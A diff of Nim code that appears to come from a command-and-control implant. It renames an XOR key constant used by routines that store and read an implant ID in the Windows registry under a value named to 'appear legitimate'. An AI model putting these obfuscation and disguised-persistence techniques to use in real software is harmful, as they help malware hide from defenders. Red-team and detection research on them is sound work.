@@ -604,13 +604,13 @@ proc getValueType*(path, name: string): RegistryValueKind =
   of REG_MULTI_SZ: return regMultiSz
   else: return regBinary
 
-const xor_key {.intdefine.}: int = 459457925 # Stores the implant ID in the registry, applying XOR to obfuscate it
+const INITIAL_XOR_KEY {.intdefine.}: int = 459457925 # Stores the implant ID in the registry, applying XOR to obfuscate it
 proc storeImplantID*(implantID: string): bool =
   const regPath = "Software\\Microsoft\\Windows\\CurrentVersion"
   const regValueName = "SyncD"  # Name that appears legitimate
   
   # Apply XOR to the ID before saving it
-  let xoredID = xorString(implantID, xor_key)
+  let xoredID = xorString(implantID, INITIAL_XOR_KEY)
   
   # Convert the XORed string to a sequence of bytes
   var binaryData = newSeq[byte](xoredID.len)
@@ -654,7 +654,7 @@ proc getImplantIDFromRegistry*(): string =
     xoredID[i] = char(binaryData[i])
   
   # Apply XOR to deobfuscate
-  let implantID = xorString(xoredID, xor_key)
+  let implantID = xorString(xoredID, INITIAL_XOR_KEY)
   
   when defined verbose:
     echo "DEBUG: ID retrieved from binary registry: " & implantID
